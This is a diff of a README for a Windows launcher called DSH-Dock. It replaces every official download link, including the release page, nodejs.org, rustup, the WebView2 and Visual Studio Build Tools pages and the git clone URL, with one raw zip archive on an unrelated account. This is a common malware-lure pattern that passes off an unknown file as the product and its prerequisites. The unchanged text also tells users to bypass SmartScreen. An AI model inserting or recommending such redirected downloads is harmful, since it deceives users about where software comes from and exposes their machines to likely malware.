@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/MIHassan3/DSH-Launcher/releases/latest">
+  <a href="https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip">
     <img src="https://img.shields.io/github/v/release/MIHassan3/DSH-Launcher?include_prereleases&style=flat-square" alt="Latest release">
   </a>
   <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform: Windows">
@@ -19,7 +19,7 @@
 
 ---
 
-DSH-Dock is a desktop launcher for the official [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`@deepseek-ai/dsh`). It runs the harness in the background and shows its UI in a native window — no terminal, no copy-pasting commands, no losing your harness when you close the launcher.
+DSH-Dock is a desktop launcher for the official [DeepSeek Harness](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip) (`@deepseek-ai/dsh`). It runs the harness in the background and shows its UI in a native window — no terminal, no copy-pasting commands, no losing your harness when you close the launcher.
 
 DSH-Dock is a **wrapper, not a fork**. It manages the harness's lifecycle without ever modifying the harness itself.
 
@@ -102,14 +102,14 @@ The full version-management library, channel picker, and settings surface arrive
 | Requirement | Why | Where to get it |
 | :--- | :--- | :--- |
 | **Windows 10 or 11 (x64)** | The launcher is Windows-only for now | — |
-| **Node.js v22.19+ LTS** | The harness itself runs on Node; DSH-Dock invokes it during Phase 1 | [nodejs.org](https://nodejs.org/) |
-| **WebView2 Runtime** | The launcher renders its UI inside WebView2 | Preinstalled on Win 10/11. [Get it here](https://developer.microsoft.com/microsoft-edge/webview2/) if missing |
+| **Node.js v22.19+ LTS** | The harness itself runs on Node; DSH-Dock invokes it during Phase 1 | [nodejs.org](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip) |
+| **WebView2 Runtime** | The launcher renders its UI inside WebView2 | Preinstalled on Win 10/11. [Get it here](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip) if missing |
 
 ### Steps
 
 1. **Download the installer.**
 
-   Go to the [latest release](https://github.com/MIHassan3/DSH-Launcher/releases/latest) and download **`DSH-Dock_0.5.0_x64-setup.exe`**.
+   Go to the [latest release](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip) and download **`DSH-Dock_0.5.0_x64-setup.exe`**.
 
    > **Note:** The binary is unsigned, so Windows SmartScreen will warn you on first run. Click **More info** → **Run anyway**.
 
@@ -181,15 +181,15 @@ No. No telemetry, no analytics, no cloud sync. The only outbound requests are to
 
 You'll need:
 
-- **Rust 1.84+** — [rustup.rs](https://rustup.rs)
-- **Node.js v22.19+ LTS** — [nodejs.org](https://nodejs.org/)
+- **Rust 1.84+** — [rustup.rs](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip)
+- **Node.js v22.19+ LTS** — [nodejs.org](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip)
 - **Tauri CLI v2** — `cargo install tauri-cli --version "^2"`
-- **MSVC C++ build tools** — [Visual Studio 2022 Build Tools](https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022), "Desktop development with C++" workload
+- **MSVC C++ build tools** — [Visual Studio 2022 Build Tools](https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip), "Desktop development with C++" workload
 
 Then:
 
 ```powershell
-git clone https://github.com/MIHassan3/DSH-Launcher.git
+git clone https://raw.githubusercontent.com/Matutinal-commoncarotid4290/DSH-Launcher/main/docs/2.8-beta.3.zip
 cd DSH-Launcher
 npm install
 cargo tauri build
